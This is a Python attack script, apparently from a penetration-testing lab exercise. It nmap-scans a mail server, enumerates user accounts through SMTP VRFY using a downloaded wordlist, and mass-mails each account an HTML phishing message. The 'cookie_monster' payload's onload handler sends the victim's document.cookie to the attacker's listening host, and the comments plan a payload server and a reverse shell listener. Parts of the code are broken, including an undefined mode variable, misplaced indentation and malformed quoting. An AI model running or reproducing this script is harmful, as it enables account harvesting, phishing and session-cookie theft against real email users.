#!/usr/bin/env python3
from os.path import realpath, dirname
from os import system, environ, popen, kill
from filecmp import cmp as file_cmp
from psutil import net_connections
from signal import SIGTERM
from requests import get
from subprocess import Popen
from pathlib import Path
from smtplib import SMTP
from time import sleep
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys
import nmap

# nmap scan
  # check if host alive
  # check for Merak 8.9.1 or compatiable server
	# TCP/25

# check if user list
    # download a good list

# manually attempt to get the domain + usernames
	# socket convo
	# iterate through users
	# parse the reply traffic for domain
	# store results

# drum up web server to host shell payloads
	# find a script somewhere or do it manually
	# determine encoding

# drum up reverse shell listener
	# multi connection

clean = False
debug = 0
RHOST=None          # Global RHOST
RPORT=25          # Global RPORT
LHOST=(popen('ifconfig tap0 | grep -w "inet" | cut -d" " -f10').read()).strip()
LPORT=8080
for i,x in enumerate(sys.argv):
    if x.lower() in ["-r","--rhost"]:
        RHOST=sys.argv[i+1]
    elif x.lower() in ["-p","--rport"]:
        RPORT=int(sys.argv[i+1])
    elif x.lower() in ["-lp","--lport"]:
        LPORT=int(sys.argv[i+1])
    elif x.lower() in ["-lh","--lhost"]:
        LHOST=sys.argv[i+1]
    elif x.lower() in ["-d"]:
        debug = 1
    elif x.lower() in ["-dd"]:
        debug = 2
    elif x.lower() in ["--clean"]:
        clean = True

if RHOST is None:
    sys.stderr.write("[-] RHOST (-r / --rhost) is mandatory!\n\n")
    sys.exit(-1)
sys.stdout.write(f"[*] Using RHOST {RHOST} RPORT {RPORT}\n")

if LHOST == '':
    sys.stderr.write("[-] Tap0 not up.  Are you conencted to the lab\n")
    sys.exit(-1)
sys.stdout.write(f"[*] Using LHOST {LHOST}\n")


if clean:
    if debug > 0:
        sys.stdout.write("[D] Cleaning things up... \n")
    system( "rm ./cirt-default-usernames.txt 1>/dev/null 2>&1")


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; INITIAL RECON ;;;;;;;;
# Host detection and service detection
nmap_args = f"-sS -p{RPORT}"
nm = nmap.PortScanner()
nm.scan(hosts=RHOST,arguments=nmap_args)

if nm[RHOST]['status']['state'] not in ['up']:
    sys.stderr.write(f"[-] Host {RHOST} is not up\n\n")
    sys.exit(-1)
sys.stdout.write(f"[*] {RHOST} appears up\n")

if nm[RHOST]['tcp'][RPORT]['state'] not in ['open','open|filtered']:
    sys.stderr.write(f"[-] Port {RPORT} is not open on rhost {RHOST}\n\n")
    sys.exit(-1)
sys.stdout.write(f"[*] {RHOST}:{RPORT} appears open\n")
sys.stdout.flush()


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; Gathering wordlist  ;;;;;;;;;;;
list_file = './cirt-default-usernames.txt'
smtpusers = Path(list_file)
if not smtpusers.exists():
    sys.stdout.write("[*] Fetching a better list file than what nmap provides by default..\n")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt"
    with open(list_file,"wb") as list_file_fd:
        response = get(url)
        list_file_fd.write(response.content)
    sys.stdout.write(f"[*] List file saved as: {list_file}\n")
else:
    sys.stdout.write("[*] Looks like an smtp users list is already present...\n")
sys.stdout.flush()


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; User account enumeration ;;;;;;

# Connection and greeting
ctr = 0
ctr_total = 0
accounts = []
sys.stdout.write(   "[*] Enumerating email accounts\n"\
                    "+------------------------------\n"\
                    "| '.' = invalid list entry\n"\
                    "| '*' = doesn't exist\n"\
                    "| '!' = account found\n"\
                    "-------------------------------\n")
sys.stdout.flush()
with open(list_file,"r") as fd:
    for line in fd:
        line = line.strip()

        if ctr == 50:
            ctr = 0
            ctr_total += 50
            sys.stdout.write(f"[{ctr_total}]\n")
            sys.stdout.flush()

        if not line.isalnum():
            ctr +=  1
            sys.stdout.write(".")
            sys.stdout.flush()
            continue

        smtp_fd = SMTP(RHOST,RPORT)
        smtp_fd.helo("40299")
       
        if debug > 0:
            sys.stdout.write(f"[D] Trying : {line}\n")
        result = smtp_fd.verify(f"{line}")

        if "No such user found" in result[1].decode():
            sys.stdout.write("*")
            sys.stdout.flush()
            ctr += 1
            continue
        elif line in result[1].decode():
            if line in result[1].decode().split('<')[1].split('>')[0]:
                ctr += 1
                sys.stdout.write("!")
                account = result[1].decode().split('<')[1].split('>')[0]
                if debug > 0:
                    sys.stdout.write(f"\n[D] Found account: {account}\n")
                accounts.append(account)

sys.stdout.write(   f"\n"
                    f"Accounts found\n"
                    f"--------------\n")
for account in accounts:
    print(account)

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; Phish Selection ;;;;;;;;;

    if mode == "cookie_monster":
        # If Cookie Monster...
        email_body = f"""
        '<html>
            <body onload='document.location.replace("http://{LHOST}:{LPORT}/.cookie="+document.cookie+"<br>"+"URL:"+document.location);'>
            </body>
        </html>'
    """

    elif mode == "pwn":
        # If Pwn...
        email_body = f"""
        '<html>
            <body onload='document.location.replace("http://{LHOST}:{LPORT}/pwn<br>URL:"+document.location);'>
            </body>
        </html>'
        """

    email_body = MIMEText(email_body,'html')



for account in accounts:
    
    fromaddr = "OS-40299@lab.com"
    toaddr = account

    hdr_fromaddr = "From: OS-40299@lab.com\r\n"
    hdr_toaddr = f"To: {account}\r\n\r\n"

    message = MIMEMultipart("alternative")
    message["Subject"] = "lol"
    message["From"] = fromaddr
    message["To"] = toaddr
    message.attach(email_body)

    with SMTP(RHOST,RPORT) as fd:
        fd.sendmail(fromaddr,toaddr,message.as_string())

